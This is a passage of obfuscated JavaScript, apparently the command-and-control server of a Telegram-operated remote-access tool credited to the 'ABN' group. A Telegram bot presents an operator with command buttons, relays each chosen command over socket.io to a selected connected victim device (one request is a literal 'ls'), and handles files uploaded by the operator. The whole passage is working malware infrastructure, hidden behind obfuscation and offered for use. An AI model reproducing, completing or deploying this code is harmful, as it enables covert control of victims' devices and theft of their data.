                                                        bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x5e45b8(0x2bb) + _0x5e45b8(0x2b6) + _0x5e45b8(0x299) + _0x5e45b8(0x3bb) + _0x20b5f2 + _0x5e45b8(0x20f) + '\n👨‍💻 تم تطوير هذا البوت من قبل قائد 『ABN』 @Aosab\n🏢 تم انشاء هذا البوت بواسطة منظمة 『ABN』', {
                                                            'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                                                            'reply_markup': {
                                                                'keyboard': [
                                                                    [
                                                                        _0x39eaaf[_0x5e45b8(0x2d9)],
                                                                        _0x39eaaf[_0x5e45b8(0x2bf)]
                                                                    ],
                                                                    [
                                                                        _0x39eaaf[_0x5e45b8(0x2ed)],
                                                                        _0x39eaaf[_0x5e45b8(0x2ab)]
                                                                    ],
                                                                    [
                                                                        _0x39eaaf[_0x5e45b8(0x34f)],
                                                                        _0x39eaaf[_0x5e45b8(0x309)]
                                                                    ],
                                                                    [
                                                                        _0x39eaaf[_0x5e45b8(0x2b1)],
                                                                        _0x39eaaf[_0x5e45b8(0x3b2)]
                                                                    ],
                                                                    [
                                                                        _0x39eaaf[_0x5e45b8(0x30f)],
                                                                        _0x39eaaf[_0x5e45b8(0x3f2)]
                                                                    ],
                                                                    [
                                                                        _0x39eaaf[_0x5e45b8(0x259)],
                                                                        _0x39eaaf[_0x5e45b8(0x3fa)]
                                                                    ],
                                                                    [
                                                                        _0x39eaaf[_0x5e45b8(0x208)],
                                                                        _0x39eaaf[_0x5e45b8(0x2c7)]
                                                                    ],
                                                                    [
                                                                        _0x39eaaf[_0x5e45b8(0x2b8)],
                                                                        _0x39eaaf[_0x5e45b8(0x230)]
                                                                    ],
                                                                    [
                                                                        _0x39eaaf[_0x5e45b8(0x2a5)],
                                                                        _0x39eaaf[_0x5e45b8(0x374)]
                                                                    ],
                                                                    [_0x39eaaf[_0x5e45b8(0x3a4)]],
                                                                    [
                                                                        _0x39eaaf[_0x5e45b8(0x395)],
                                                                        _0x39eaaf[_0x5e45b8(0x31b)]
                                                                    ],
                                                                    [
                                                                        _0x39eaaf[_0x5e45b8(0x3d0)],
                                                                        _0x39eaaf[_0x5e45b8(0x393)]
                                                                    ],
                                                                    [_0x39eaaf[_0x5e45b8(0x225)]]
                                                                ],
                                                                'resize_keyboard': !![],
                                                                'one_time_keyboard': !![]
                                                            }
                                                        });
                                                    } else {
                                                        if (actions[_0x5e45b8(0x2f3)](_0x517bec[_0x5e45b8(0x3ea)])) {
                                                            let _0xc65239 = appData[_0x5e45b8(0x214)](_0x39eaaf[_0x5e45b8(0x30d)]);
                                                            _0x39eaaf[_0x5e45b8(0x30c)](_0x517bec[_0x5e45b8(0x3ea)], _0x39eaaf[_0x5e45b8(0x2d9)]) && (io['to'](_0xc65239)[_0x5e45b8(0x391)](_0x39eaaf[_0x5e45b8(0x345)], {
                                                                'request': _0x39eaaf[_0x5e45b8(0x288)],
                                                                'extras': []
                                                            }), appData[_0x5e45b8(0x319)](_0x39eaaf[_0x5e45b8(0x30d)]), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x343)] + '\n👨‍💻 تم تطوير هذا البوت من قبل قائد 『ABN』 @Aosab\n🏢 تم انشاء هذا البوت بواسطة منظمة 『ABN』', {
                                                                'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                                                                'reply_markup': {
                                                                    'keyboard': [
                                                                        [
                                                                            _0x39eaaf[_0x5e45b8(0x3a1)],
                                                                            _0x39eaaf[_0x5e45b8(0x3e3)]
                                                                        ],
                                                                        [_0x39eaaf[_0x5e45b8(0x37c)]]
                                                                    ],
                                                                    'resize_keyboard': !![]
                                                                }
                                                            })), _0x39eaaf[_0x5e45b8(0x30c)](_0x517bec[_0x5e45b8(0x3ea)], _0x39eaaf[_0x5e45b8(0x2bf)]) && (io['to'](_0xc65239)[_0x5e45b8(0x391)](_0x39eaaf[_0x5e45b8(0x345)], {
                                                                'request': _0x39eaaf[_0x5e45b8(0x388)],
                                                                'extras': []
                                                            }), appData[_0x5e45b8(0x319)](_0x39eaaf[_0x5e45b8(0x30d)]), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x343)] + '\n👨‍💻 تم تطوير هذا البوت من قبل قائد 『ABN』 @Aosab\n🏢 تم انشاء هذا البوت بواسطة منظمة 『ABN』', {
                                                                'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                                                                'reply_markup': {
                                                                    'keyboard': [
                                                                        [
                                                                            _0x39eaaf[_0x5e45b8(0x3a1)],
                                                                            _0x39eaaf[_0x5e45b8(0x3e3)]
                                                                        ],
                                                                        [_0x39eaaf[_0x5e45b8(0x37c)]]
                                                                    ],
                                                                    'resize_keyboard': !![]
                                                                }
                                                            })), _0x39eaaf[_0x5e45b8(0x38b)](_0x517bec[_0x5e45b8(0x3ea)], _0x39eaaf[_0x5e45b8(0x2ed)]) && (io['to'](_0xc65239)[_0x5e45b8(0x391)](_0x39eaaf[_0x5e45b8(0x345)], {
                                                                'request': _0x39eaaf[_0x5e45b8(0x349)],
                                                                'extras': []
                                                            }), appData[_0x5e45b8(0x319)](_0x39eaaf[_0x5e45b8(0x30d)]), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x343)] + '\n👨‍💻 تم تطوير هذا البوت من قبل قائد 『ABN』 @Aosab\n🏢 تم انشاء هذا البوت بواسطة منظمة 『ABN』', {
                                                                'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                                                                'reply_markup': {
                                                                    'keyboard': [
                                                                        [
                                                                            _0x39eaaf[_0x5e45b8(0x3a1)],
                                                                            _0x39eaaf[_0x5e45b8(0x3e3)]
                                                                        ],
                                                                        [_0x39eaaf[_0x5e45b8(0x37c)]]
                                                                    ],
                                                                    'resize_keyboard': !![]
                                                                }
                                                            })), _0x39eaaf[_0x5e45b8(0x264)](_0x517bec[_0x5e45b8(0x3ea)], _0x39eaaf[_0x5e45b8(0x2ab)]) && (io['to'](_0xc65239)[_0x5e45b8(0x391)](_0x39eaaf[_0x5e45b8(0x345)], {
                                                                'request': _0x39eaaf[_0x5e45b8(0x399)],
                                                                'extras': []
                                                            }), appData[_0x5e45b8(0x319)](_0x39eaaf[_0x5e45b8(0x30d)]), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x343)] + '\n👨‍💻 تم تطوير هذا البوت من قبل قائد 『ABN』 @Aosab\n🏢 تم انشاء هذا البوت بواسطة منظمة 『ABN』', {
                                                                'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                                                                'reply_markup': {
                                                                    'keyboard': [
                                                                        [
                                                                            _0x39eaaf[_0x5e45b8(0x3a1)],
                                                                            _0x39eaaf[_0x5e45b8(0x3e3)]
                                                                        ],
                                                                        [_0x39eaaf[_0x5e45b8(0x37c)]]
                                                                    ],
                                                                    'resize_keyboard': !![]
                                                                }
                                                            })), _0x39eaaf[_0x5e45b8(0x3ff)](_0x517bec[_0x5e45b8(0x3ea)], _0x39eaaf[_0x5e45b8(0x34f)]) && (io['to'](_0xc65239)[_0x5e45b8(0x391)](_0x39eaaf[_0x5e45b8(0x345)], {
                                                                'request': _0x39eaaf[_0x5e45b8(0x39f)],
                                                                'extras': []
                                                            }), appData[_0x5e45b8(0x319)](_0x39eaaf[_0x5e45b8(0x30d)]), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x343)] + '\n👨‍💻 تم تطوير هذا البوت من قبل قائد 『ABN』 @Aosab\n🏢 تم انشاء هذا البوت بواسطة منظمة 『ABN』', {
                                                                'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                                                                'reply_markup': {
                                                                    'keyboard': [
                                                                        [
                                                                            _0x39eaaf[_0x5e45b8(0x3a1)],
                                                                            _0x39eaaf[_0x5e45b8(0x3e3)]
                                                                        ],
                                                                        [_0x39eaaf[_0x5e45b8(0x37c)]]
                                                                    ],
                                                                    'resize_keyboard': !![]
                                                                }
                                                            })), _0x39eaaf[_0x5e45b8(0x354)](_0x517bec[_0x5e45b8(0x3ea)], _0x39eaaf[_0x5e45b8(0x309)]) && (io['to'](_0xc65239)[_0x5e45b8(0x391)](_0x39eaaf[_0x5e45b8(0x345)], {
                                                                'request': _0x39eaaf[_0x5e45b8(0x2be)],
                                                                'extras': []
                                                            }), appData[_0x5e45b8(0x319)](_0x39eaaf[_0x5e45b8(0x30d)]), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x343)] + '\n👨‍💻 تم تطوير هذا البوت من قبل قائد 『ABN』 @Aosab\n🏢 تم انشاء هذا البوت بواسطة منظمة 『ABN』', {
                                                                'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                                                                'reply_markup': {
                                                                    'keyboard': [
                                                                        [
                                                                            _0x39eaaf[_0x5e45b8(0x3a1)],
                                                                            _0x39eaaf[_0x5e45b8(0x3e3)]
                                                                        ],
                                                                        [_0x39eaaf[_0x5e45b8(0x37c)]]
                                                                    ],
                                                                    'resize_keyboard': !![]
                                                                }
                                                            })), _0x39eaaf[_0x5e45b8(0x379)](_0x517bec[_0x5e45b8(0x3ea)], _0x39eaaf[_0x5e45b8(0x3b2)]) && (io['to'](_0xc65239)[_0x5e45b8(0x391)](_0x39eaaf[_0x5e45b8(0x345)], {
                                                                'request': _0x39eaaf[_0x5e45b8(0x337)],
                                                                'extras': []
                                                            }), appData[_0x5e45b8(0x319)](_0x39eaaf[_0x5e45b8(0x30d)]), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x343)] + '\n👨‍💻 تم تطوير هذا البوت من قبل قائد 『ABN』 @Aosab\n🏢 تم انشاء هذا البوت بواسطة منظمة 『ABN』', {
                                                                'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                                                                'reply_markup': {
                                                                    'keyboard': [
                                                                        [
                                                                            _0x39eaaf[_0x5e45b8(0x3a1)],
                                                                            _0x39eaaf[_0x5e45b8(0x3e3)]
                                                                        ],
                                                                        [_0x39eaaf[_0x5e45b8(0x37c)]]
                                                                    ],
                                                                    'resize_keyboard': !![]
                                                                }
                                                            })), _0x39eaaf[_0x5e45b8(0x354)](_0x517bec[_0x5e45b8(0x3ea)], _0x39eaaf[_0x5e45b8(0x30f)]) && (io['to'](_0xc65239)[_0x5e45b8(0x391)](_0x39eaaf[_0x5e45b8(0x345)], {
                                                                'request': _0x39eaaf[_0x5e45b8(0x1fd)],
                                                                'extras': []
                                                            }), appData[_0x5e45b8(0x319)](_0x39eaaf[_0x5e45b8(0x30d)]), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x343)] + '\n👨‍💻 تم تطوير هذا البوت من قبل قائد 『ABN』 @Aosab\n🏢 تم انشاء هذا البوت بواسطة منظمة 『ABN』', {
                                                                'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                                                                'reply_markup': {
                                                                    'keyboard': [
                                                                        [
                                                                            _0x39eaaf[_0x5e45b8(0x3a1)],
                                                                            _0x39eaaf[_0x5e45b8(0x3e3)]
                                                                        ],
                                                                        [_0x39eaaf[_0x5e45b8(0x37c)]]
                                                                    ],
                                                                    'resize_keyboard': !![]
                                                                }
                                                            })), _0x39eaaf[_0x5e45b8(0x221)](_0x517bec[_0x5e45b8(0x3ea)], _0x39eaaf[_0x5e45b8(0x2b8)]) && (io['to'](_0xc65239)[_0x5e45b8(0x391)](_0x39eaaf[_0x5e45b8(0x345)], {
                                                                'request': _0x39eaaf[_0x5e45b8(0x320)],
                                                                'extras': []
                                                            }), appData[_0x5e45b8(0x319)](_0x39eaaf[_0x5e45b8(0x30d)]), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x343)] + '\n👨‍💻 تم تطوير هذا البوت من قبل قائد 『ABN』 @Aosab\n🏢 تم انشاء هذا البوت بواسطة منظمة 『ABN』', {
                                                                'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                                                                'reply_markup': {
                                                                    'keyboard': [
                                                                        [
                                                                            _0x39eaaf[_0x5e45b8(0x3a1)],
                                                                            _0x39eaaf[_0x5e45b8(0x3e3)]
                                                                        ],
                                                                        [_0x39eaaf[_0x5e45b8(0x37c)]]
                                                                    ],
                                                                    'resize_keyboard': !![]
                                                                }
                                                            })), _0x39eaaf[_0x5e45b8(0x2af)](_0x517bec[_0x5e45b8(0x3ea)], _0x39eaaf[_0x5e45b8(0x230)]) && (io['to'](_0xc65239)[_0x5e45b8(0x391)](_0x39eaaf[_0x5e45b8(0x345)], {
                                                                'request': _0x39eaaf[_0x5e45b8(0x2d8)],
                                                                'extras': []
                                                            }), appData[_0x5e45b8(0x319)](_0x39eaaf[_0x5e45b8(0x30d)]), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x343)] + '\n👨‍💻 تم تطوير هذا البوت من قبل قائد 『ABN』 @Aosab\n🏢 تم انشاء هذا البوت بواسطة منظمة 『ABN』', {
                                                                'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                                                                'reply_markup': {
                                                                    'keyboard': [
                                                                        [
                                                                            _0x39eaaf[_0x5e45b8(0x3a1)],
                                                                            _0x39eaaf[_0x5e45b8(0x3e3)]
                                                                        ],
                                                                        [_0x39eaaf[_0x5e45b8(0x37c)]]
                                                                    ],
                                                                    'resize_keyboard': !![]
                                                                }
                                                            })), _0x39eaaf[_0x5e45b8(0x2e0)](_0x517bec[_0x5e45b8(0x3ea)], _0x39eaaf[_0x5e45b8(0x2a5)]) && (io['to'](_0xc65239)[_0x5e45b8(0x391)](_0x39eaaf[_0x5e45b8(0x3bc)], {
                                                                'request': 'ls',
                                                                'extras': []
                                                            }), appData[_0x5e45b8(0x319)](_0x39eaaf[_0x5e45b8(0x30d)]), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x343)] + '\n👨‍💻 تم تطوير هذا البوت من قبل قائد 『ABN』 @Aosab\n🏢 تم انشاء هذا البوت بواسطة منظمة 『ABN』', {
                                                                'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                                                                'reply_markup': {
                                                                    'keyboard': [
                                                                        [
                                                                            _0x39eaaf[_0x5e45b8(0x3a1)],
                                                                            _0x39eaaf[_0x5e45b8(0x3e3)]
                                                                        ],
                                                                        [_0x39eaaf[_0x5e45b8(0x37c)]]
                                                                    ],
                                                                    'resize_keyboard': !![]
                                                                }
                                                            })), _0x39eaaf[_0x5e45b8(0x3e5)](_0x517bec[_0x5e45b8(0x3ea)], _0x39eaaf[_0x5e45b8(0x374)]) && (io['to'](_0xc65239)[_0x5e45b8(0x391)](_0x39eaaf[_0x5e45b8(0x345)], {
                                                                'request': _0x39eaaf[_0x5e45b8(0x3c9)],
                                                                'extras': []
                                                            }), appData[_0x5e45b8(0x319)](_0x39eaaf[_0x5e45b8(0x30d)]), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x343)] + '\n👨‍💻 تم تطوير هذا البوت من قبل قائد 『ABN』 @Aosab\n🏢 تم انشاء هذا البوت بواسطة منظمة 『ABN』', {
                                                                'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                                                                'reply_markup': {
                                                                    'keyboard': [
                                                                        [
                                                                            _0x39eaaf[_0x5e45b8(0x3a1)],
                                                                            _0x39eaaf[_0x5e45b8(0x3e3)]
                                                                        ],
                                                                        [_0x39eaaf[_0x5e45b8(0x37c)]]
                                                                    ],
                                                                    'resize_keyboard': !![]
                                                                }
                                                            })), _0x39eaaf[_0x5e45b8(0x3be)](_0x517bec[_0x5e45b8(0x3ea)], _0x39eaaf[_0x5e45b8(0x2b1)]) && (appData[_0x5e45b8(0x3fe)](_0x39eaaf[_0x5e45b8(0x3e0)], _0x39eaaf[_0x5e45b8(0x243)]), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x343)] + '\n👨‍💻 تم تطوير هذا البوت من قبل قائد 『ABN』 @Aosab\n🏢 تم انشاء هذا البوت بواسطة منظمة 『ABN』', {
                                                                'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                                                                'reply_markup': {
                                                                    'keyboard': [[_0x39eaaf[_0x5e45b8(0x260)]]],
                                                                    'resize_keyboard': !![],
                                                                    'one_time_keyboard': !![]
                                                                }
                                                            })), _0x39eaaf[_0x5e45b8(0x24a)](_0x517bec[_0x5e45b8(0x3ea)], _0x39eaaf[_0x5e45b8(0x213)]) && (appData[_0x5e45b8(0x3fe)](_0x39eaaf[_0x5e45b8(0x3e0)], _0x39eaaf[_0x5e45b8(0x3df)]), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x29a)] + '\n👨‍💻 تم تطوير هذا البوت من قبل قائد 『ABN』 @Aosab\n🏢 تم انشاء هذا البوت بواسطة منظمة 『ABN』', {
                                                                'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                                                                'reply_markup': {
                                                                    'keyboard': [[_0x39eaaf[_0x5e45b8(0x260)]]],
                                                                    'resize_keyboard': !![],
                                                                    'one_time_keyboard': !![]
                                                                }
                                                            })), _0x39eaaf[_0x5e45b8(0x403)](_0x517bec[_0x5e45b8(0x3ea)], _0x39eaaf[_0x5e45b8(0x259)]) && (appData[_0x5e45b8(0x3fe)](_0x39eaaf[_0x5e45b8(0x3e0)], _0x39eaaf[_0x5e45b8(0x207)]), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x3b3)] + '\n👨‍💻 تم تطوير هذا البوت من قبل قائد 『ABN』 @Aosab\n🏢 تم انشاء هذا البوت بواسطة منظمة 『ABN』', {
                                                                'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                                                                'reply_markup': {
                                                                    'keyboard': [[_0x39eaaf[_0x5e45b8(0x260)]]],
                                                                    'resize_keyboard': !![],
                                                                    'one_time_keyboard': !![]
                                                                }
                                                            })), _0x39eaaf[_0x5e45b8(0x30b)](_0x517bec[_0x5e45b8(0x3ea)], _0x39eaaf[_0x5e45b8(0x393)]) && (appData[_0x5e45b8(0x3fe)](_0x39eaaf[_0x5e45b8(0x3e0)], _0x39eaaf[_0x5e45b8(0x38f)]), bot[_0x5e45b8(0x373)] = _0x39eaaf[_0x5e45b8(0x3de)](ssage, data['id'], _0x39eaaf[_0x5e45b8(0x3a2)] + '\n👨‍💻 تم تطوير هذا البوت من قبل قائد 『ABN』 @Aosab\n🏢 تم انشاء هذا البوت بواسطة منظمة 『ABN』', {
                                                                'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                                                                'reply_markup': {
                                                                    'keyboard': [[_0x39eaaf[_0x5e45b8(0x260)]]],
                                                                    'resize_keyboard': !![],
                                                                    'one_time_keyboard': !![]
                                                                }
                                                            })), _0x39eaaf[_0x5e45b8(0x3cd)](_0x517bec[_0x5e45b8(0x3ea)], _0x39eaaf[_0x5e45b8(0x3d0)]) && (appData[_0x5e45b8(0x3fe)](_0x39eaaf[_0x5e45b8(0x3e0)], ''), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x37f)] + '\n👨‍💻 تم تطوير هذا البوت من قبل قائد 『ABN』 @Aosab\n🏢 تم انشاء هذا البوت بواسطة منظمة 『ABN』', {
                                                                'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                                                                'reply_markup': {
                                                                    'keyboard': [[_0x39eaaf[_0x5e45b8(0x260)]]],
                                                                    'resize_keyboard': !![],
                                                                    'one_time_keyboard': !![]
                                                                }
                                                            })), _0x39eaaf[_0x5e45b8(0x40e)](_0x517bec[_0x5e45b8(0x3ea)], _0x39eaaf[_0x5e45b8(0x3fa)]) && (appData[_0x5e45b8(0x3fe)](_0x39eaaf[_0x5e45b8(0x3e0)], _0x39eaaf[_0x5e45b8(0x212)]), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x32c)] + '\n👨‍💻 تم تطوير هذا البوت من قبل قائد 『ABN』 @Aosab\n🏢 تم انشاء هذا البوت بواسطة منظمة 『ABN』', {
                                                                'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                                                                'reply_markup': {
                                                                    'keyboard': [[_0x39eaaf[_0x5e45b8(0x260)]]],
                                                                    'resize_keyboard': !![],
                                                                    'one_time_keyboard': !![]
                                                                }
                                                            })), _0x39eaaf[_0x5e45b8(0x3ff)](_0x517bec[_0x5e45b8(0x3ea)], _0x39eaaf[_0x5e45b8(0x31b)]) && (io['to'](_0xc65239)[_0x5e45b8(0x391)](_0x39eaaf[_0x5e45b8(0x345)], {
                                                                'request': _0x39eaaf[_0x5e45b8(0x1fc)],
                                                                'extras': []
                                                            }), appData[_0x5e45b8(0x319)](_0x39eaaf[_0x5e45b8(0x30d)]), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x343)] + '\n👨‍💻 تم تطوير هذا البوت من قبل قائد 『ABN』 @Aosab\n🏢 تم انشاء هذا البوت بواسطة منظمة 『ABN』', {
                                                                'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                                                                'reply_markup': {
                                                                    'keyboard': [
                                                                        [
                                                                            _0x39eaaf[_0x5e45b8(0x3a1)],
                                                                            _0x39eaaf[_0x5e45b8(0x3e3)]
                                                                        ],
                                                                        [_0x39eaaf[_0x5e45b8(0x37c)]]
                                                                    ],
                                                                    'resize_keyboard': !![]
                                                                }
                                                            })), _0x39eaaf[_0x5e45b8(0x3a9)](_0x517bec[_0x5e45b8(0x3ea)], _0x39eaaf[_0x5e45b8(0x3a4)]) && (appData[_0x5e45b8(0x3fe)](_0x39eaaf[_0x5e45b8(0x3e0)], _0x39eaaf[_0x5e45b8(0x3ed)]), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x33d)] + '\n👨‍💻 تم تطوير هذا البوت من قبل قائد 『ABN』 @Aosab\n🏢 تم انشاء هذا البوت بواسطة منظمة 『ABN』', {
                                                                'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                                                                'reply_markup': {
                                                                    'keyboard': [[_0x39eaaf[_0x5e45b8(0x260)]]],
                                                                    'resize_keyboard': !![],
                                                                    'one_time_keyboard': !![]
                                                                }
                                                            })), _0x39eaaf[_0x5e45b8(0x338)](_0x517bec[_0x5e45b8(0x3ea)], _0x39eaaf[_0x5e45b8(0x395)]) && (appData[_0x5e45b8(0x3fe)](_0x39eaaf[_0x5e45b8(0x3e0)], _0x39eaaf[_0x5e45b8(0x40c)]), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x2a9)] + '\n👨‍💻 تم تطوير هذا البوت من قبل قائد 『ABN』 @Aosab\n🏢 تم انشاء هذا البوت بواسطة منظمة 『ABN』', {
                                                                'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                                                                'reply_markup': {
                                                                    'keyboard': [[_0x39eaaf[_0x5e45b8(0x260)]]],
                                                                    'resize_keyboard': !![],
                                                                    'one_time_keyboard': !![]
                                                                }
                                                            })), _0x39eaaf[_0x5e45b8(0x2c8)](_0x517bec[_0x5e45b8(0x3ea)], _0x39eaaf[_0x5e45b8(0x208)]) && (appData[_0x5e45b8(0x3fe)](_0x39eaaf[_0x5e45b8(0x3e0)], _0x39eaaf[_0x5e45b8(0x38a)]), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x2b7)] + '\n👨‍💻 تم تطوير هذا البوت من قبل قائد 『ABN』 @Aosab\n🏢 تم انشاء هذا البوت بواسطة منظمة 『ABN』', {
                                                                'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                                                                'reply_markup': {
                                                                    'keyboard': [[_0x39eaaf[_0x5e45b8(0x260)]]],
                                                                    'resize_keyboard': !![],
                                                                    'one_time_keyboard': !![]
                                                                }
                                                            }));
                                                        } else
                                                            io[_0x5e45b8(0x3c1)][_0x5e45b8(0x3c1)][_0x5e45b8(0x35e)]((_0x4324b2, _0x200d29, _0x5e4345) => {
                                                                const _0x588eb1 = _0x5e45b8;
                                                                _0x39eaaf[_0x588eb1(0x2c8)](_0x517bec[_0x588eb1(0x3ea)], _0x4324b2[_0x588eb1(0x3a6)]) && (appData[_0x588eb1(0x3fe)](_0x39eaaf[_0x588eb1(0x30d)], _0x200d29), bot[_0x588eb1(0x369) + 'e'](data['id'], _0x588eb1(0x2bb) + _0x588eb1(0x2b6) + _0x588eb1(0x299) + _0x588eb1(0x3bb) + _0x4324b2[_0x588eb1(0x3a6)] + _0x588eb1(0x20f) + '\n👨‍💻 تم تطوير هذا البوت من قبل قائد 『ABN』 @Aosab\n🏢 تم انشاء هذا البوت بواسطة منظمة 『ABN』', {
                                                                    'parse_mode': _0x39eaaf[_0x588eb1(0x2b9)],
                                                                    'reply_markup': {
                                                                        'keyboard': [
                                                                            [
                                                                                _0x39eaaf[_0x588eb1(0x2d9)],
                                                                                _0x39eaaf[_0x588eb1(0x2bf)]
                                                                            ],
                                                                            [
                                                                                _0x39eaaf[_0x588eb1(0x2ed)],
                                                                                _0x39eaaf[_0x588eb1(0x2ab)]
                                                                            ],
                                                                            [
                                                                                _0x39eaaf[_0x588eb1(0x34f)],
                                                                                _0x39eaaf[_0x588eb1(0x309)]
                                                                            ],
                                                                            [
                                                                                _0x39eaaf[_0x588eb1(0x2b1)],
                                                                                _0x39eaaf[_0x588eb1(0x3b2)]
                                                                            ],
                                                                            [
                                                                                _0x39eaaf[_0x588eb1(0x30f)],
                                                                                _0x39eaaf[_0x588eb1(0x213)]
                                                                            ],
                                                                            [
                                                                                _0x39eaaf[_0x588eb1(0x259)],
                                                                                _0x39eaaf[_0x588eb1(0x3fa)]
                                                                            ],
                                                                            [
                                                                                _0x39eaaf[_0x588eb1(0x208)],
                                                                                _0x39eaaf[_0x588eb1(0x2c7)]
                                                                            ],
                                                                            [
                                                                                _0x39eaaf[_0x588eb1(0x2b8)],
                                                                                _0x39eaaf[_0x588eb1(0x230)]
                                                                            ],
                                                                            [
                                                                                _0x39eaaf[_0x588eb1(0x2a5)],
                                                                                _0x39eaaf[_0x588eb1(0x374)]
                                                                            ],
                                                                            [_0x39eaaf[_0x588eb1(0x3a4)]],
                                                                            [
                                                                                _0x39eaaf[_0x588eb1(0x395)],
                                                                                _0x39eaaf[_0x588eb1(0x31b)]
                                                                            ],
                                                                            [
                                                                                _0x39eaaf[_0x588eb1(0x3d0)],
                                                                                _0x39eaaf[_0x588eb1(0x393)]
                                                                            ],
                                                                            [_0x39eaaf[_0x588eb1(0x225)]]
                                                                        ],
                                                                        'resize_keyboard': !![],
                                                                        'one_time_keyboard': !![]
                                                                    }
                                                                }));
                                                            });
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}), bot['on'](_0x286428(0x232), _0x35f9cf => {
    const _0x5a80a5 = _0x286428, _0x5e9760 = {
            'ybnqY': _0x5a80a5(0x2a3) + '\n👨‍💻 تم تطوير هذا البوت من قبل قائد 『ABN』 @Aosab\n🏢 تم انشاء هذا البوت بواسطة منظمة 『ABN』',
            'fWhNC': _0x5a80a5(0x381) + _0x5a80a5(0x214),
            'Rvhty': _0x5a80a5(0x23e) + _0x5a80a5(0x3f4) + _0x5a80a5(0x3b8) + _0x5a80a5(0x26a) + _0x5a80a5(0x315) + _0x5a80a5(0x2a1) + _0x5a80a5(0x372) + _0x5a80a5(0x3e2) + _0x5a80a5(0x3cb) + '\n👨‍💻 تم تطوير هذا البوت من قبل قائد 『ABN』 @Aosab\n🏢 تم انشاء هذا البوت بواسطة منظمة 『ABN』',
            'Wctnu': _0x5a80a5(0x364),
            'NCwTW': _0x5a80a5(0x281) + _0x5a80a5(0x34c),
            'vqfuH': _0x5a80a5(0x36e) + _0x5a80a5(0x1f6),
            'BHPlN': _0x5a80a5(0x397) + _0x5a80a5(0x29b) + '✯',
            'YIyqH': _0x5a80a5(0x3e8) + _0x5a80a5(0x371),
            'RpRKE': _0x5a80a5(0x2dd),
            'YHZtD': _0x5a80a5(0x3af),
            'ojySU': _0x5a80a5(0x1f5),
            'CfeUK': function (_0x363382, _0x3949a7) {
                return _0x363382 === _0x3949a7;
            },
            'hdJEG': _0x5a80a5(0x302) + 'e'
        };
    if (_0x5e9760[_0x5a80a5(0x31d)](appData[_0x5a80a5(0x214)](_0x5e9760[_0x5a80a5(0x26e)]), _0x5e9760[_0x5a80a5(0x237)])) {
        let _0x2fe8a7 = _0x35f9cf[_0x5a80a5(0x232)][_0x5a80a5(0x3ca)], _0x4bed83 = appData[_0x5a80a5(0x214)](_0x5e9760[_0x5a80a5(0x269)]);
        bot[_0x5a80a5(0x366) + 'k'](_0x2fe8a7)[_0x5a80a5(0x2cd)](_0x5f4d18 => {
            const _0x20e6a4 = _0x5a80a5, _0x19bb35 = _0x5e9760[_0x20e6a4(0x274)][_0x20e6a4(0x1f3)]('|');
            let _0x56af87 = -0x44c + 0x4be * -0x2 + 0xdc8;
            while (!![]) {
                switch (_0x19bb35[_0x56af87++]) {
                case '0':
                    appData[_0x20e6a4(0x319)](_0x5e9760[_0x20e6a4(0x269)]);
                    continue;
                case '1':
